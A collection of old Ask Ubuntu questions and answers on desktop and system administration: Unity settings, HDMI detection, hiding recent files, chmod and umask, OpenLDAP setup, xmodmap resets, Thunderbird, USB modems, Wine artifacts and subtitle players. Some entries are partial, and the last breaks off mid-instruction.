back-lit.\n\n\n*\n\n*Backlight Always On - the icon back light will always be on.\n\n\n\n\n\n\n*Backlight Toggles - the icon back light will be on as long as the application is running.\n\n\n\n\n\n*Backlight Always Off - pretty much the opposite of the first option.\n\n\n\n\n\n*\n\n*Edge Illumination Toggles - the edge illumination  will be on as long as the application is running.\n\n\n\n\n\n*\n\n*Backlight and Edge Illumination Toggles - the backlight and edge illumination  will be on as long as the application is running.\n\n\n\n\n\n*\n\n*The Launch Animation sets how the icons are animated.\n\n\n*\n\n*None - no animation will be shown.\n\n*Pulse Until Running - the icon's back light will pulse till it loads up.\n\n*Blink - the icon's back light will blink.\n\n\n*The Urgent Animation sets how an icon will inform you of something important.\n\n\n*\n\n*None - no animation.\n\n*Pulse - it will pulse.\n\n*Wiggle - it will wiggle.\n\n\n*The Panel Opacity sets the opacity of the panel.\n\n*The Launcher Opacity sets the opacity of the Launcher.\n\n*The Launcher icon size sets the size of the launcher in pixels.\n\n*The Hide Animation sets how the launcher will hide and unhide.\n\n\n*\n\n*Fade on bfb and Slide - fades based on the position of your cursor in the bfb (big funny button - the one in the top left of your launcher with the Ubuntu circle of friends on it) and slides.\n\n*Slide only - it will only slide.\n\n*Fade only - it will only fade.\n\n*Fade and Slide - it will fade and slide.\n\n\n*The Dash Blur sets the level of blur in the dash.\n\n\n*\n\n*No Blur\n\n*Static - snapshot of the desktop that doesn't get updated (in cases where the drivers can't handle it)\n\n*Active Blur - This means it actively blurs what is behind it. \n\n\n*The Automaximize value sets the minimum value to trigger automaximize.\n\n*Show Devices sets when to show devices in the launcher.\n\n\n*\n\n*Never - Devices are never shown in the launcher.\n\n*Only Mounted - Device that are mounted are shown in the launcher.\n\n*Always - Devices are always shown in the launcher.\n\n\n\nConfiguration Editor (dconf-editor)\nThere are also some options you can edit using dconf-editor (needs to be installed first by installing dconf-tools at Ubuntu Software Center or by clicking here):\n\n\n*\n\n*Open up the Configuration Editor by pressing Alt + F2 and typing dconf-editor\n\n*Navigate to Desktop -> Unity to find the first two options:\n\n\n*\n\n*form-factor: The form factor chosen will affect the size of the Dash. Desktop uses a fixed sized Dash, Netbook will always maximize the Dash to screen size, Automatic decides whether to use Desktop or Netbook based on the screen resolution.\n\n*home-expanded: Whether the home screen of the Dash should be expanded (Expanded) or not (Not Expanded).\nExtra tip for changing dash/launcher color\nA new feature for Unity in 11.10 is the ability to change the color of the dash/launcher to match the user's current wallpaper. To take advantage of this, simply set a new wallpaper for your desktop, and the color will change automatically to match.\nNote that more advanced control over the dash/launcher color (i.e., setting them to separate or arbitrary colors regardless of the wallpaper chosen) is currently not possible...at least not through an option. The dash/launcher color can actually be arbitrarily set by using an image editor to change the center pixels of your chosen wallpaper to the desired color. (See the OMG! Ubuntu article documenting this here.)\n", "Q: HDMI port not recognized on Sony Vaio I am running Ubuntu 11.10 64bit with a Sony VAIO VPC F11. It has an NVIDIA GeForce 310M video card, with the latest Nvidia drivers for the 64 bit linux, and a Windows partition with Win7 64bit.\nNVIDIA driver version is NVIDIA-Linux-x86_64-280.13\nExternal monitor is Samsung SyncMaster P2770\nIf I boot into the Windows partition, the HDMI works as expected, with sound and video-- under linux, the HDMI port is not recognized at all, apparently, and provides no signal to the attached monitor. The nividia-settings tool does not recognize any monitor connected to the HDMI port.\nDisper is installed and cannot recognize an attached external monitor.\nCan anyone help me diagnose this issue and fix it if possible? The laptop has only the one HDMI port to connect any external monitor, so it I can't get this working I'm stuck using either the laptop screen or Windows.\nThanks\n\nA: If you have your NVIDIA X.org drivers installed you should be able to run the config panel. There, when your external monitor is connected via HDMI port, you can detect displays and configure X server behaviour, eg. arrange displays in a way you need them to be.\nUnfortunately, if you connect a TV to your VAIO you may not have any sound going to your TV, due to some problems with ALSA drivers.\n\nA: I would recommend to install a tool called disper. It's a command line tool focused on NVIDIA-drivers, because they don't support xrandr.\ndisper: disper on launchpad\nTry disper -l to list all attached displays. If it is found, you can switch between your displays with disper.\n", "Q: How can I keep recent files from appearing in Unity? I sometimes browse erotic media files but I would like to avoid having them appear in files & folders / recent. How can I do that?\nThe old \"making .recently-used.xbel a folder\" trick from 10.10 and older doesn't work any more. \nPlus I'd prefer to turn off tracking only temporarily.\nI also prefer not to use a separate user for this, as switching users sometimes isn't fast enough.\n\nA: Just rename the folder after browsing. After you renamed it, the files in there won't show up in unity recent files. Pretty easy solution, just make sure you don't forget it every time you use that folder :)\n(Sry for my english)\n\nA: The old \"making .recently-used.xbel a folder\" trick does work, but now the file is in ~/.local/share so:\n$ rm ~/.local/share/recently-used.xbel\n$ mkdir ~/.local/share/recently-used.xbel\n\n...works for me :)\n\nA: There is a way to do it, but it will clear all the other recent files as well.\nAll you have to do is run the following commands:\nrm ~/.local/share/zeitgeist/activity.sqlite\nzeitgeist-daemon --replace\n\nEdit zeitgiest/activity.sqlite no longer exists on my system:\nrm ~/.local/share/zeitgeist\nzeitgeist-daemon --replace\n\nIt takes a moment, but it repopulates as the daemon starts.  \nUpdate: Activity Log Manager has been released. This is a GUI tool that allows you to tweak the Zeitgeist history: you can delete part of the Zeitgeist history, blacklist some applications or prevent logging certain types of files as well as blacklist folders. \nInstall it using the commands below:\nsudo add-apt-repository ppa:zeitgeist/ppa\nsudo apt-get update\nsudo apt-get upgrade\nzeitgeist-daemon --replace\nsudo apt-get install activity-log-manager\n\nI've recorded a video demoing Activity Log Manager here: http://www.youtube.com/watch?v=-eQn7ZyfSlw\n\nA: Zeitgeist's developers are working on Zeitgeist Global Privacy. It will allow to remove part of Zeitgeist history (last hour, week, etc), blacklist an application or file type from the history and exclusion of a folder from the history. A few screenshots are provided in the linked blog post.\n\nA: The answer pointing to the activity log manager is true for zeitgeist. But zeitgeist is not the only way the system keeps track of recently used files. Some applications still use the old method, where access to folders and files is written to a central log file located at ~/.local/share/recently-used.xbel. This older activity logger is called GtkRecentManager. You can read more about the interplay between zeitgeist and its older counterpart here.\nIn contrast to zeitgeist, there is no official GNOME tool for GtkRecentManager that would allow controlling what get's logged and what doesn't. However, as Bazon pointed out in a comment above there is a third-party solution which does the job quite well: \nGTK+ Recent Files Scrubber by ssokolow\nFrom the project page:\n\nSo, you keep running for GNOME to wipe your recent files list and,\n  sooner or later, you decide that it'd be easier to just turn it off\n  altogether and that you wouldn't really be losing anything in the\n  process.\nThis tool takes a slightly different approach inspired by the\n  HistoryBlock extension for Firefox. With this scrubber, you give it a\n  list of places that you don't want to show up in your recent files\n  list, then you get on with your life. (And it does its job\n  discreetly.)\nThe scrubber will sit in the background, waiting for new files to\n  appear in the list. If they match any of the entries in your\n  blacklist, it kicks them back out. No fuss, no muss. You just set it\n  and forget it.\n\nThe tool only offers a CLI interface but is comparatively easy to use. Instructions can be found on the project page and CLI help:\n$ gtk_cleanup.py --help \n\nUsage: gtk_cleanup.py [options]\n\nA simple little tool which watches GTK+'s global recent files list and\nremoves anything that matches a hashed blacklist of URI prefixes.\n\nOptions:\n  --version             show program's version number and exit\n  -h, --help            show this help message and exit\n  -v, --verbose         Increase the verbosity. Use twice for extra effect.\n  -q, --quiet           Decrease the verbosity. Use twice for extra effect.\n\n  Resident-Compatible Actions:\n    --purge             Purge all Recently Used entries during the initial\n                        scrub.\n    --config=FILE       Specify a non-default config file\n\n  Non-Resident Actions:\n    -a URI, --add=URI   Add URI to the list of blacklisted prefixes.\n    -r URI, --remove=URI\n                        Remove prefixes from the blacklist which match URI\n    --once              Don't become resident. Just scrub and exit.\n\n\nA: Method 1: Using Activity Log Manager\nUbuntu Precise 12.04\nIn Ubuntu Precise Activity Log Manager 0.9 is included by default. It can be accessed from System Settings or just by looking for Privacy.\n\n\nOr you can simply type Privacy in Dash\n\nNow you can start blacklisting applications. Screenshots\n\n\n\n\nActivity Log Manager in Oneiric and first release\nYou can install Activity Log Manager from the Stable PPA. \nFor more details about Activity Log Manager you should check out the article on OMG! Ubuntu! and article on Webupd8\nA new version of Activity Log Manager is in development which looks better and is simpler to use. A screenshot of the unreleased Activity Log Manager\n\n\nMethod 2: Using Gnome Activity Journal\nYou can do it, provided that there is some pattern in the files. For example you have kept all your explicit content in folder /home/mrpig/erotica/ folder.\nThen open Activity Journal which is a GUI frontend to Zeitgeist which acts as a Dashboard showing your recent activities. On top right Zeitgeist Icon, click it and Preferences. Check \"Blacklist Manager\" plugin\nThen goto \"BlackList Manager\" tab.\nClick on New button, and then edit the new entry which comes as file:///home/mrpig/erotica/*\n\nLinked Question:\n\n\n*\n\n*Hidden files are shown in Dash\n\nA: What I do is, I just rename the folder, add a _ at the end and it is gone from the list.

However, omitting the u doesn't seem to have any effect.\n\nA: Requirements\nFirst of all I suggest you to read these questions and the answers linked below:\n\n\n*\n\n*What is the difference between “chmod +x” and “chmod 755”?\n\n*What is “umask” and how does it work?\nIt helps you understand all the necessary parts you need to know.\n\nShort version\n\n\n*\n\n*chmod +x is equal to chmod ugo+x (Based on umask value)\n\n*chmod a+x is equal to chmod ugo+x (Without considering umask value)\n\n\n\nExplanation\nThe result of chmod a+x is to set the executable bit for everyone (Owner, Group, Others), easy right? \nHowever with chmod +x it's a little bit tricky, it says use umask value and based on that value add the x to everyone that is allowed.\nSo if the umask of my environment is 0002:\n$ umask\n0002\n$ umask -S\nu=rwx,g=rwx,o=rx\n\nIt's going to add x to user (owner), group and others, in this situation (which is the default situation for most systems) it's exactly like chmod ugo+x or the same as chmod a+x, or in a more verbose form:\nchmod u+x,g+x,o+x\n\nCan you spot the connection between chmod u+x,g+x,o+x and the output of umask -S? \nNow let’s change the umask of the current shell to 0003:\n$ umask 0003\n$ umask\n0003\n$ umask -S\nu=rwx,g=rwx,o=r\n\nAs you can see now only owner and group are going to get the executable bit and not the others. It means chmod +x is now equal to chmod u+x,g+x or chmod ug+x.\n\nQuestion time!\nWhat happens if I run chmod +w on a file after setting umask to 0003?\nSame as before, it only affects user and group of the file because 3 also removes the write permission (2).\n\nBonus\nIt has the same effect when you are removing a bit like chmod -w:\n$ mkdir test\n$ stat -c %A test\ndrwxrwxr-x\n\n$ umask\n0002\n\n$ chmod +w test\n$ stat -c %A test\ndrwxrwxr-x\n\n$ chmod a+w test\n$ stat -c %A test\ndrwxrwxrwx\n\n$ chmod -w test\nchmod: test/: new permissions are r-xr-xrwx, not r-xr-xr-x\n\n$ stat -c %A test\ndr-xr-xrwx\n\n\nA: Just doing +x will apply it to all flags: [u]ser, [g]roup, [o]thers.\nType man chmod for more information.\n\nA: The man page of chmod covers that.\n\n\n*\n\n*u stands for user.\n\n*g stands for group.\n\n*o stands for others.\n\n*a stands for all.\n\n\nThat means that chmod u+x somefile will grant only the owner of that file execution permissions whereas chmod +x somefile is the same as chmod a+x somefile. \nThe chmod man page says:\n\nThe format of a symbolic mode is\n  [ugoa...][[+-=][rwxXstugo...]...][,...].\n  Multiple symbolic operations can be\n  given, separated by commas.\nA combination of the letters 'ugoa'\n  controls which users' access to the\n  file will be changed: the user who\n  owns it (u), other users in the file's\n  group (g), other users not in the\n  file's group (o), or all users (a). If\n  none of these are given, the effect is\n  as if 'a' were given, but bits that\n  are set in the umask are not affected.\n\n\nA: *\n\n*chmod u+x file means add the executable bit to the owner of the file while ignoring the umask (Your mod will be set, no question).\n\n*chmod +x file means add the executable bit to the owner, group and others while considering the umask (First check with umask then apply the mods, it might have different effects based on umask's value ).\n\nlet's create two files:\n$ touch file1 file2\n$ ls -l file1 file2\n-rw-rw-rw- 1 ravexina ravexina 0 Aug  5 01:45 file1\n-rw-rw-rw- 1 ravexina ravexina 0 Aug  5 01:45 file2\n\nNow I set the umask to \"111\" to remove executable bits: umask 111.\n$ chmod u+x file1\n$ chmod  +x file2\n\n$ ls -l file1 file2\n-rwxrw-rw- 1 ravexina ravexina 0 Aug  5 01:47 file1\n-rw-rw-rw- 1 ravexina ravexina 0 Aug  5 01:47 file2\n\nAs you can see the chmod ignored the umask and the file1 got executable bit for its owner however the second one did nothing because it's considering umask's value.\n\nA: chmod u+x will made the file executable for your user (it will only add it for your user, though it may be already executable by the group owner, or \"other\").  \nchmod +x or chmod a+x ('all plus executable bit') makes the file executable by everyone. \nIf you do this to a directory, it makes the directory searchable, instead.  I.e., you can list the contents of a directory that you have +x permission on.\n", "Q: \"ldap_add: Naming violation (64)\" error when configuring OpenLDAP I am following the Ubuntu server guide to configure OpenLDAP on an Ubuntu 10.04 server, but can not get it to work.\nWhen I try to use sudo ldapadd -x -D cn=admin,dc=don,dc=com -W -f frontend.ldif I'm getting the following error:\nEnter LDAP Password: <entered 'secret' as password>\nadding new entry \"dc=don,dc=com\"\nldap_add: Naming violation (64)\n      additional info: value of single-valued naming attribute 'dc' conflicts with value present in entry\n\nAgain when I try to do the same, I'm getting the following error:\nroot@avy-desktop:/home/avy# sudo ldapadd -x -D cn=admin,dc=don,dc=com -W -f frontend.ldif\nEnter LDAP Password:\nldap_bind: Invalid credentials (49)\n\n\nHere is the backend.ldif file:\n# Load dynamic backend modules\ndn: cn=module,cn=config\nobjectClass: olcModuleList\ncn: module\nolcModulepath: /usr/lib/ldap\nolcModuleload: back_hdb\n\n# Database settings\ndn: olcDatabase=hdb,cn=config\nobjectClass: olcDatabaseConfig\nobjectClass: olcHdbConfig\nolcDatabase: {1}hdb\nolcSuffix: dc=don,dc=com\nolcDbDirectory: /var/lib/ldap\nolcRootDN: cn=admin,dc=don,dc=com\nolcRootPW: secret\nolcDbConfig: set_cachesize 0 2097152 0\nolcDbConfig: set_lk_max_objects 1500\nolcDbConfig: set_lk_max_locks 1500\nolcDbConfig: set_lk_max_lockers 1500\nolcDbIndex: objectClass eq\nolcLastMod: TRUE\nolcDbCheckpoint: 512 30\nolcAccess: to attrs=userPassword by dn=\"cn=admin,dc=don,dc=com\" write by anonymous auth by self write by * none\nolcAccess: to attrs=shadowLastChange by self write by * read\nolcAccess: to dn.base=\"\" by * read\nolcAccess: to * by dn=\"cn=admin,dc=don,dc=com\" write by * read\n\n\nfrontend.ldif file:\n# Create top-level object in domain\ndn: dc=don,dc=com\nobjectClass: top\nobjectClass: dcObject\nobjectclass: organization\no: Example Organization\ndc: Example\ndescription: LDAP Example \n\n# Admin user.\ndn: cn=admin,dc=don,dc=com\nobjectClass: simpleSecurityObject\nobjectClass: organizationalRole\ncn: admin\ndescription: LDAP administrator\nuserPassword: secret\n\ndn: ou=people,dc=don,dc=com\nobjectClass: organizationalUnit\nou: people\n\ndn: ou=groups,dc=don,dc=com\nobjectClass: organizationalUnit\nou: groups\n\ndn: uid=john,ou=people,dc=don,dc=com\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nuid: john\nsn: Doe\ngivenName: John\ncn: John Doe\ndisplayName: John Doe\nuidNumber: 1000\ngidNumber: 10000\nuserPassword: password\ngecos: John Doe\nloginShell: /bin/bash\nhomeDirectory: /home/john\nshadowExpire: -1\nshadowFlag: 0\nshadowWarning: 7\nshadowMin: 8\nshadowMax: 999999\nshadowLastChange: 10877\nmail: john.doe@don.com\npostalCode: 31000\nl: Toulouse\no: Example\nmobile: +33 (0)6 xx xx xx xx\nhomePhone: +33 (0)5 xx xx xx xx\ntitle: System Administrator\npostalAddress:\ninitials: JD\n\ndn: cn=example,ou=groups,dc=don,dc=com\nobjectClass: posixGroup\ncn: example\ngidNumber: 10000\n\nCan anyone help me?\n\nA: This link helped install LDAP without any error and had to edit only the starting lines 2,3 and 4.

The message i get when hovering over this is that the update information is out of date, and that this may be caused by an unavailable repository or a network isssue.\nMy network connection appears to be ok.\nThe message advises i manually check for updates. When i do this, i get the following message:\n\nW:Failed to fetch\n  http://ppa.launchpad.net///ubuntu/dists/maverick/main/source/Sources.gz\n  404  Not Found , W:Failed to fetch\n  http://ppa.launchpad.net///ubuntu/dists/maverick/main/binary-amd64/Packages.gz\n  404  Not Found , E:Some index files\n  failed to download, they have been\n  ignored, or old ones used instead.\n\nAny idea whats going on?\n\nA: The best way I have found of solving most problems with \"failed to fetch\" is to check that you are using the best server. The reason this works is that in the process of selecting the best server it has to ping each of the available servers to find the one that responds the fastest. If there is anything wrong at your end the entire process would probably fail otherwise it my select a different server if the one you normally use is down for maintenance.

But it won't. When it's turned off the LCD still lights up the whole room. Many have proposed the \"solution\" of setting the machine into hibernation instead but that however won't work for me, since I'm unable to suspend my system.\nIt is the LCD/IR-module that prevents me from suspending and I haven't found a solution to properly unload it on suspending (it's way above my linux knowledge).

I read that it is a bug with USB3.0 that has been fixed in the Natty release but has not been included in Maverick. What I needed to do was to add the line SUSPEND_MODULES=\"xhci\" to the file /etc/pm/config.d/unload_module and then it suspended, ergo the LCD is also black.

How do I clear xmodmap settings?\nI have an IBM model M, and somehow xkeycaps got it into its head that my End key was not any key at all. xev reports keypresses when I use it, so I know the event is being generated by the keyboard. Also, xkeycaps thinks that my arrow keys are all wonky, and apparently the scrollbar is broken so it only scrolls down - so I can't scroll up to find an IBM keyboard that just maybe is close to my map so I can fix my keys.\nSo I'm trying to reset my keyboard to the default settings, but the xmodmap manpage is woefully devoid of \"reset all\" or \"clear all\" or anything of that nature (that I was able to find).\n\nA: Experimenting with xmodmap, I messed up my key settings by using\n xmodmap -en \"keysym BackSpace = Delete\".   Thought the -n flag would cause no action to be taken because the man xmodmap page stated that\n-n      This  option indicates that xmodmap should not change the mappings, but should display what it would\n               do, like make(1) does when given this option.\n\nHowever, the command caused my Delete key to be useless.\nAfter reading the above, I just typed setxkbmap, hoping it would show me the options, whereas in fact it returned immediately with no output, and then my Delete key was miraculously working again!\nSo it looks as though\nsetxkbmap\n\nalone will do the job...\n\nA: xmodmap has no notion of state, so it has no way to reset state directly.  You can simulate it by using xmodmap -pke >.xmodmap.orig before making any changes (although it doesn't save the modifier map, which you would have to save and restore manually) — but it's a bit too late for that.\nModern systems don't generally use xmodmap to configure the keyboard, though.  setxkbmap is the modern way to do it; and that does reset bindings when run.  So you may be able to use setxkbmap -layout us to reset things to normal.  More complete would be to check for the default configuration in /etc/X11/xorg.conf.  For example, on my system\njinx:718 Z$ sed -n '/Identifier.*Keyboard/,/EndSection/p' /etc/X11/xorg.conf\n        Identifier      \"Generic Keyboard\"\n        Driver  \"kbd\"\n        Option  \"XkbModel\"      \"pc105\"\n        Option  \"XkbLayout\"     \"us\"\n        Option  \"XkbOptions\"    \"grp:alt_shift_toggle\"\nEndSection\n\nThe corresponding command is\nsetxkbmap -model pc105 -layout us -option grp:alt_shift_toggle\n\nIf there were an XkbVariant entry in the output, you would pass its value with -variant.  One thing to watch out for is that options are handled specially:  you can only set one option per -option parameter, and you need to use -option '' to reset parameters first.  So to fully reset when there is something like XkbOptions \"grp:alt_shift_toggle,grp:ctrls_toggle\" you would need\nsetxkbmap -model pc105 -layout us -option '' -option grp:alt_shift_toggle -option grp:ctrls_toggle\n\n\nA: setxkbmap -option resets the meta keys to default.\n\nA: I execute xmodmap commands via terminal.\nAfter restarting GNOME(ALT+f2 r Enter) it reverts back. Kind of workaround but works.\nAlso this is better option.\n\n*\n\n*https://superuser.com/a/1483559/507962\n", "Q: How to install Awesome WM without root access?

One of the mailboxes used to get a lot of spam so I guess this accounts for the 667GB. I opened up Thunderbird to see how much space the inbox actually takes up and it turns out to be approximately 500MB - over 1000 times less than the stuff that has not been compacted over the years.\nSo i right clicked on the inbox directory in the tree on the left of Thunderbird and selected 'compact'. I left it for about 12hours but even after that it still said 'compacting folder' on the status bar. I don't use Thunderbird on this PC - it belonged to a colleague who has left the company, however I do occasionally need to look through the inbox for references to the project I am working on, so deleting all traces of Thunderbird is not an option.\nMy question is - is there any way I can monitor the progress of Thunderbird's compacting function? I would really like to know how long it is going to take.\nIf there is any way I can speed up the compacting process i would also like to know.\n\nA: i found a much quicker solution! just right click on the each inbox and select properties. then under the 'general information' tab select 'rebuild index'. this took about 30 seconds and cleaned the whole thing up!\n$ df -h\nFilesystem            Size Used Avail Use% Mounted on\n/dev/sda1             895G  120G  730G  15% /\nnone                  4.0G  300K  4.0G   1% /dev\nnone                  4.0G  1.5M  4.0G   1% /dev/shm\nnone                  4.0G  140K  4.0G   1% /var/run\nnone                  4.0G     0  4.0G   0% /var/lock\nnone                  4.0G     0  4.0G   0% /lib/init/rw\n$ du -ch | grep [0-9]G\n2.2G    ./.VirtualBox/Machines/iBike/Snapshots\n2.2G    ./.VirtualBox/Machines/iBike\n2.2G    ./.VirtualBox/Machines\n2.2G    ./.VirtualBox\n4.3G    .\n4.3G    total\n\nfar out! from 667GB to less than 1GB in 30 seconds!! that was quick! :)\n\nA: Since you are using IMAP, the mail is stored on the server, and just cached locally.  You can shut down thunderbird and go into that directory and just delete the giant file.  You also might want to make sure that you have the checkbox to sync the folder locally for offline access cleared.\nGiven that the directory is SO large, it looks like there is a bug that somehow caused it to fill with garbage.  Also moving messages to the trash has nothing to do with compacting a mailbox.  The trash is just another folder, so if you want to really delete the mail, you have to empty the trash.\nWhen using IAMP, compacting a folder just has thunderbird throw out the cached email.  For local mailboxes ( used with POP ), compacting rewrites the mailbox, removing any unused space.  Space normally becomes unused when you delete mail, and can be reused by new mail that fits within that space, but sometimes the spaces can be so small that they can't be reused, and if there are many of them, it adds up.\n", "Q: Configure USB GSM Modem I want to configure EVDO Usb Modem in Ubuntu 10.10\nI insert my usb modem to laptop and check the usb is detected or not using $sudo lsusb  and the result is:\nBus 003 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub\nBus 005 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub\nBus 002 Device 002: ID 201e:2009\nBus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub\nBus 004 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub\nBus 001 Device 003: ID 14cd:6600 Super Top USB 2.0 IDE DEVICE \n\nBus 002 Device 002: ID 201e:2009 is my us device. \nand than I execute command $dmesg | grep -e tty\n[    0.000000] console [tty0] enabled\n[  818.054660] usb 2-1.3: GSM modem (1-port) converter now attached to ttyUSB0\n[  818.055125] usb 2-1.3: GSM modem (1-port) converter now attached to ttyUSB1\n[  818.055647] usb 2-1.3: GSM modem (1-port) converter now attached to ttyUSB2\n[  818.330641] option1 ttyUSB0: GSM modem (1-port) converter now disconnected from ttyUSB0\n[  818.330743] option1 ttyUSB1: GSM modem (1-port) converter now disconnected from ttyUSB1\n[  818.330840] option1 ttyUSB2: GSM modem (1-port) converter now disconnected from ttyUSB2\n[ 1054.917473] usb 2-1.2: GSM modem (1-port) converter now attached to ttyUSB0\n[ 1054.917995] usb 2-1.2: GSM modem (1-port) converter now attached to ttyUSB1\n[ 1054.918481] usb 2-1.2: GSM modem (1-port) converter now attached to ttyUSB2\n[ 1055.214087] option1 ttyUSB0: GSM modem (1-port) converter now disconnected from ttyUSB0\n[ 1055.214221] option1 ttyUSB1: GSM modem (1-port) converter now disconnected from ttyUSB1\n[ 1055.214356] option1 ttyUSB2: GSM modem (1-port) converter now disconnected from ttyUSB2\n\nWhy converter disconnected from ttyUSB2 ? \nand than I try to execute command $sudo wvdialconf\nsorry, no modem was detected!

Almost always only a single character type is affected at once, and only in one font size (though that size can change over time). Most of the time things are fine, but this happens several times a day. It happens frequently in Firefox, but system dialogs, menus, etc. can also be affected.\nIt's been happening ever since I upgraded to 10.10. Only restarting seems to fix it.\nTwo examples (in the first, only the larger \"r\" is corrupted):\n\n\nAny help would be appreciated, thanks.\nEdit: I've since noticed that I can (sometimes) make the fonts appear correctly by zooming in/out all the way and returning to the default in Firefox (one or two steps, then going back, does nothing) seems to make the problem go away temporarily.\nEdit 2: I figure it's worth noting that the solution below doesn't fully work for me any longer (I'm now using Ubuntu 11.10). It does significantly reduce the frequency of this problem occurring.\nEdit 3: Still around in 12.04. The fix provided by Vanni works perfectly now for me, but apparently doesn't for some.\nEdit 4: This seems to be an xorg problem, with Vanni's answer fixing it for many Intel video cards.

I want to develop a little application and I want to add events to the calendar of the Gnome panel clock. How does it work? Is there a D-Bus Interface I can use? Or can I directly access the evolution-data-server?\n\nA: The Evolution-python library lets you access Evolution Data Server in Python.\n\nA: For Ubuntu 12.10 Claasic (With Gnome-Panel)\nEvolution-Python module has been depreciated now. Evolution Data Server 3.6 can be accessed with Python using gobject introspection.

In Ubuntu when new mail arrives Evolution changes message indicator to green color. I have migrated from Evolution to Thunderbird and that is why looking for how to make Thunderbird react like Evolution once a new mail arrives.\nUPDATE 1\nI have forgotten to note that I don't have administrator privileges in my working computer.\nThanks\n\nA: There is an extension that integrates Thunderbird with the Ubuntu Messaging menu (and also provides NotifyOSD notifications) that comes in a PPA. Here's a screenshot:\n\nTo install it in Ubuntu, use the following commands:\nsudo add-apt-repository ppa:ruben-verweij/thunderbird-indicator\nsudo apt-get update\nsudo apt-get install xul-ext-indicator libnotify-bin\n\nYou'll then find it in the Thunderbird extensions. The PPA provides packages for Ubuntu 10.10 and 11.04, though the 11.04 version is a bit more advanced and allows you only display notifications for messages that arrive in a certain folder, etc.\nThere was also an add-on for Thunderbird, based on the above extension, but it has since been removed.\n\nA: Or you can use popper. This is an e-mail checker applications, and it can start Thunderbird too.\n\nA: In latest releases of Ubuntu - 12.04 and later, Thunderbird is default mail-client and by default, notifies of new mail.\nSo, I would suggest upgrading to 12.04 or 12.10.\n\n\n\nFor details on how to configure notifications for selected Folders in Thunderbird please refer to this post.\n\nA: Not exactly what you need but I have used this addon of thunderbird which minimizes to tray and gives pop up notification for new messages.\n", "Q: Scripts used by `jockey-common` Is it possible to make a script that basically does the same thing as jockey-common? i.e. An script to find any hardware that requires proprietary drivers and install them.\nEDIT As Oli mentioned, the scripts are already present in Ubuntu, if any of you are already aware as to which script corresponds to which options listed in jockey-text --help and how to use them, please answer!\n\nA: I'm not sure I know what you want to achieve but jockey-text will let you detect and install drivers from the command line.\nIt has various arguments where you'd be able to parse the output and feed them back into it via a script. Just look at jockey-text --help\nIf you need to really play around with how it works, it's all Python (with a light dusting of dbus) so you're free to just dive in and hack around with whatever you want.\nYou can find the scripts in /usr/lib/python2.6/dist-packages/jockey/ (this path will change in future Ubuntu versions when there's a different Python version being used) and you can see how jockey-text interfaces with this in its own script here: /usr/bin/jockey-text.\nI'd suggest inheriting jockey.ui.AbstractUI like jockey-text does and working it from there. It's not a simple application though. It's going to take a bit of time to figure out what's actually happening inside that class before you can meaningfully use it.\n", "Q: Black or Corrupt UI Artifacts Under Wine This is something that's been bugging me for quite some time.\nI'm attaching a screenshot of the issue as seen in Microsoft Office Word 2007.\n\nWhile it doesn't get in the way when it's like this, I've had to uninstall other apps as the black artefacts affected usability.\nHere is the same issue in Excel 2007.\n\nSetup\nI'm running 32-bit Ubuntu 10.10, with an Intel 945 chipset.\n\nA: Judging from Word 2007's AppDB page this looks more to be a graphics driver bug\n\nxf86-video-intel 2.12.0 and newer\nGUI controls are painted black: http://bugs.freedesktop.org/show_bug.cgi?id=30157   Downgrade to 2.11.0.\n\nReverting to an older driver is not really practical (it's possible but it's a very manual process).

The subtitles positioning seems to be hard-coded in it and even though the style is user-customizable, it does not confirm to the formatting in subtitle data. In some scenes where writings appear, the subtitles are supposed to appear next to those along with what is being said at that moment. However, on those scenes the translations of text onscreen appears on the default subtitle area with nothing about the things being said.\nThe correct rendering are according to the open-source Windows video player, Media Player Classic - Home Cinema. There is no Linux port as far as I'm aware.\nIf VLC's subtitle support is the same as in Windows, it won't work for me, period.\nPlease suggest anyway to improve subtitle rendering in Totem, other video players, or a way to port MPC-HC.\nUpdate\nI've determined that the subtitle rendering issue is not video player-specific. As suggested in the answers, I tried MPlayer, and again the subtitle formatting was overridden by default settings somewhere. I ran SMPlayer in Windows with the same videos, but this issue is not reproducible on it.\nUpdate\nSMPlayer on Ubuntu renders subtitles perfectly. I am at a loss to understand why the core MPlayer could not do so. Additionally, anyone know how to disable the while seek bar that appears in the center when moving forward/backward?\nUpdate\nWith my interaction on MPlayer's mailing list, I discovered that -ass flag is required for correct ASS/SSA subtitle rendering.\n\nA: I would suggest using MPlayer. It's a really nice, feature-rich player, but often beginners have problem with the interface (CLI based by design) and the \"too many possibilities\" (which is also the result of being feature-rich player btw). \"Raw MPlayer\" (without frontends) allows you to position your subtitles with keys 'r' and 't', also you can try key 'a' to modify alignment. You can also learn about options and default keybindings by typing man mplayer within terminal. You can also visit the documentation of MPlayer at MPlayer's site: http://www.mplayerhq.hu/DOCS/HTML/en/MPlayer.html\nYou can also try to use many of the GUI based frontends written for MPlayer, like SMPlayer, Gnome mplayer, etc. MPlayer has its own GUI too, some people say it's not so good as some frontends though. On default install it can be launched with command 'gmplayer' or by looking the menu item showing installed softwares (make sure you haven't tried the nogui version - from the package name - because it has not got GUI support compiled in!).\nAbout your question: mplayer can use TTF fonts, shaded/antialiased, positioned, etc as subtitles, so as far as I can imagine it should be enough for your needs, if usability is not a problem at least :)\n\nA: You might want to try mplayer (not to be confused with Media Player).  It is installable through Synaptic.\n\nA: \" SMplayer will scale the subtitles to the same resolution as the video, even in fullscreen mode by default. So a video with low resolution will display quite unclear subtitles. You can fix this easily by going to Preferences > Advanced > options for mplayer and adding “-vo gl” (without the quotes) to options. Styled subtitles will still be rendered correctly.\"\noriginal post http://sathyasays.com/2008/06/30/how-to-styled-subs-in-linux/\n\nA: What I imagine you're looking for is a player that renders subtitles at desktop resolution rather than video resolution, like MPC-HC which you noted. Apart from the Mplayer based solutions mentioned already, which I don't have much experience with, you might find the subtitle rendering in XBMC much better. OTOH, If you're looking for a player to run in a window while you're working, XBMC will not fit your needs. For me, I like the fact that XBMC can both re-sync videos to the current framerate and render subtitles nicely, so it's my fullscreen video solution. It seems to run even better if run as its own desktop environment (selected during login) rather than running under Unity or Unity-2d.\n\nA: As far as I know, MPC HC is the best player with subtitles rendering.\nBut there is no straight way of using that in ubuntu.\nSo u have to use wine for that.\nInstalling MPC-HC with Wine-\nIn the terminal-\n\n\n*\n\n*Install 